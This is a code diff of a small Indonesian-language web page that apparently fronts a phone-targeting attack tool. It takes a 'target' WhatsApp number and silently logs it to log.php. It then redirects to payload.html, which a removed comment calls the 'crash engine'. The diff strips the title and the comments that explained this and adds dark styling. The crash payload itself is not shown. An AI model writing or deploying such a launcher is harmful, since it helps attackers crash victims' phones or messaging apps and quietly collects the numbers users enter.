@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sistem Pelacakan</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #0a0a0c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        .card { background: #15151b; padding: 40px; border-radius: 30px; text-align: center; border: 1px solid #330066; }
+        input { background: #20202a; border: none; padding: 15px 25px; border-radius: 50px; color: #fff; width: 250px; outline: none; margin-bottom: 20px; text-align: center; border: 2px solid #4b0082; }
+        button { background: #6a0dad; color: white; padding: 15px 40px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px #8a2be2; }
+        button:active { transform: scale(0.95); box-shadow: 0 0 40px #8a2be2; }
+        * { -webkit-tap-highlight-color: transparent; outline: none; }
+    </style>
 </head>
 <body>
-    <h2>Masukkan Data Target</h2>
-    <input type="text" id="wa" placeholder="Contoh: 08123456789" required>
-    <button onclick="proses()">PROSES</button>
-
+    <div class="card">
+        <input type="text" id="wa" placeholder="08XXXXXXXXXX">
+        <button onclick="proses()">JALANKAN</button>
+    </div>
     <script>
         function proses() {
             let num = document.getElementById('wa').value;
-            if(num === "") { alert("Masukkan nomor terlebih dahulu"); return; }
-            
-            // Mengirim data ke server tanpa pindah halaman
             fetch('log.php?num=' + encodeURIComponent(num));
-            
-            // Redirect otomatis ke engine crash
             window.location.href = 'payload.html';
         }
     </script>
